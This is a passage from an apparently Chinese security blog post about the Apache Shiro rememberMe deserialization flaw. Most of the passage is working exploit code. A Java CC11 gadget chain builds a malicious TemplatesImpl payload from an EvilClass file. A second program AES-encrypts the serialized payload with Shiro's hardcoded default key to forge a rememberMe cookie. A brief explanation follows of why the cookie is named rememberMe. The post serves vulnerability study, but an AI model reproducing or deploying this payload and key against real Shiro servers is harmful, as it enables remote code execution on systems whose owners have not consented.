</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> CC11 {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> setFieldValue(Object obj, String fileNmae, Object value) <span style="color:#fff;font-weight:bold">throws</span> Exception {
</span></span><span style="display:flex;"><span>        Field field = obj.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(fileNmae);
</span></span><span style="display:flex;"><span>        field.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>        field.<span style="color:#007f7f">set</span>(obj,value);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> main(String[] args) <span style="color:#fff;font-weight:bold">throws</span> Exception {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 构造恶意 TemplatesImpl 对象
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        TemplatesImpl obj = <span style="color:#fff;font-weight:bold">new</span> TemplatesImpl();
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 获取恶意类的字节码
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">byte</span>[] code = Files.<span style="color:#007f7f">readAllBytes</span>(Paths.<span style="color:#007f7f">get</span>(<span style="color:#0ff;font-weight:bold">&#34;/Users/reus09/Desktop/JavaSec/Deserializer/target/classes/CC11/EvilClass.class&#34;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">byte</span>[][] codes = {code};
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 反射修改属性
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        setFieldValue(obj, <span style="color:#0ff;font-weight:bold">&#34;_bytecodes&#34;</span>, <span style="color:#fff;font-weight:bold">new</span> <span style="color:#fff;font-weight:bold">byte</span>[][] {code});
</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#0ff;font-weight:bold">&#34;_name&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;HelloTemplatesImpl&#34;</span>);
</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#0ff;font-weight:bold">&#34;_tfactory&#34;</span>, <span style="color:#fff;font-weight:bold">new</span> TransformerFactoryImpl());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// ================
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#007f7f">// 利用 InvokerTransformer 调用 TemplatesImpl.newTransformer
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span>        InvokerTransformer invokerTransformer = <span style="color:#fff;font-weight:bold">new</span> InvokerTransformer(<span style="color:#0ff;font-weight:bold">&#34;newTransformer&#34;</span>, <span style="color:#fff;font-weight:bold">null</span>, <span style="color:#fff;font-weight:bold">null</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// 假的链子
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        Transformer fakeTransformer = <span style="color:#fff;font-weight:bold">new</span> ConstantTransformer(<span style="color:#ff0;font-weight:bold">1</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">//===============
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        Map innerMap = <span style="color:#fff;font-weight:bold">new</span> HashMap();
</span></span><span style="display:flex;"><span>        Map outerMap = LazyMap.<span style="color:#007f7f">decorate</span>(innerMap, fakeTransformer);
</span></span><span style="display:flex;"><span>        TiedMapEntry tme = <span style="color:#fff;font-weight:bold">new</span> TiedMapEntry(outerMap, obj);
</span></span><span style="display:flex;"><span>        Map expMap = <span style="color:#fff;font-weight:bold">new</span> HashMap();
</span></span><span style="display:flex;"><span>        expMap.<span style="color:#007f7f">put</span>(tme, <span style="color:#0ff;font-weight:bold">&#34;valuevalue&#34;</span>);
</span></span><span style="display:flex;"><span>        innerMap.<span style="color:#007f7f">remove</span>(obj);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        setFieldValue(outerMap, <span style="color:#0ff;font-weight:bold">&#34;factory&#34;</span>, invokerTransformer);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// ==============
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#007f7f">// 生成序列化字符串
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span>        ObjectOutputStream oss = <span style="color:#fff;font-weight:bold">new</span> ObjectOutputStream(<span style="color:#fff;font-weight:bold">new</span> FileOutputStream(<span style="color:#0ff;font-weight:bold">&#34;./cc11.bin&#34;</span>));
</span></span><span style="display:flex;"><span>        oss.<span style="color:#007f7f">writeObject</span>(expMap);
</span></span><span style="display:flex;"><span>        oss.<span style="color:#007f7f">close</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ObjectInputStream ois = <span style="color:#fff;font-weight:bold">new</span> ObjectInputStream(<span style="color:#fff;font-weight:bold">new</span> FileInputStream(<span style="color:#0ff;font-weight:bold">&#34;./cc11.bin&#34;</span>));
</span></span><span style="display:flex;"><span>        Object o = (Object) ois.<span style="color:#007f7f">readObject</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>运行 cc11 的 poc 生成对应文件，然后利用如下代码进行加密生成</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">byte</span>[] getBytes(String path) <span style="color:#fff;font-weight:bold">throws</span> Exception{
</span></span><span style="display:flex;"><span>        InputStream inputStream = <span style="color:#fff;font-weight:bold">new</span> FileInputStream(path);
</span></span><span style="display:flex;"><span>        ByteArrayOutputStream byteArrayOutputStream = <span style="color:#fff;font-weight:bold">new</span> ByteArrayOutputStream();
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">int</span> n = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">while</span> ((n=inputStream.<span style="color:#007f7f">read</span>())!=-<span style="color:#ff0;font-weight:bold">1</span>){
</span></span><span style="display:flex;"><span>            byteArrayOutputStream.<span style="color:#007f7f">write</span>(n);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">byte</span>[] bytes = byteArrayOutputStream.<span style="color:#007f7f">toByteArray</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> bytes;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> main(String[] args) <span style="color:#fff;font-weight:bold">throws</span>  Exception{
</span></span><span style="display:flex;"><span>        String path = <span style="color:#0ff;font-weight:bold">&#34;/Users/reus09/Desktop/JavaSec/cc11.bin&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">byte</span>[] key = Base64.<span style="color:#007f7f">decode</span>(<span style="color:#0ff;font-weight:bold">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span>);
</span></span><span style="display:flex;"><span>        AesCipherService aes = <span style="color:#fff;font-weight:bold">new</span> AesCipherService();
</span></span><span style="display:flex;"><span>        ByteSource ciphertext = aes.<span style="color:#007f7f">encrypt</span>(getBytes(path), key);
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">printf</span>(ciphertext.<span style="color:#007f7f">toString</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>攻击：<img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319195735132.png" alt="image-20230319195735132"  />
</p>
<h3 id="漏洞疑惑">漏洞疑惑<a hidden class="anchor" aria-hidden="true" href="#漏洞疑惑">#</a></h3>
<p>这里讲一下为什么<code>Cookie</code>的key要为<code>rememberMe</code>。</p>
<p>在调用调用<code>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code>方法的时候。</p>
<p><code>CookieRememberMeManager</code>的构造函数会初始化一个类<code>SimpleCookie</code>，来存储我们传输的Cookie的key和value。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319155407694.png" alt="image-20230319155407694"  />
</p>
<p>根据<code>SimpleCookie</code>的构造函数，我们可以看到<code>rememberMe</code>作为字符串传入，作为<code>cookie</code>的name。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319155605156.png" alt="image-20230319155605156"  />
</p>
<p>然后在<code>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code>方法中使用<code>org.apache.shiro.web.servlet.SimpleCookie#readValue</code>方法来根据初始化传入的name:<code>rememberMe</code>读取<code>request</code>请求中的cookie，如果不为空，就将其cookie对应的<code>value</code>返回。</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230319155845525.png" alt="image-20230319155845525"  />
</p>
<p>接下来就是我们的base64解密过程，就不在赘述。</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a></li>
    </ul>
<nav class="paginav">
  <a class="next" href="/posts/tech/java%E5%AE%89%E5%85%A8-rmi/">
    <span class="title">Next »</span>
    <br>
    <span>JAVA安全 RMI</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="">Reus09&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
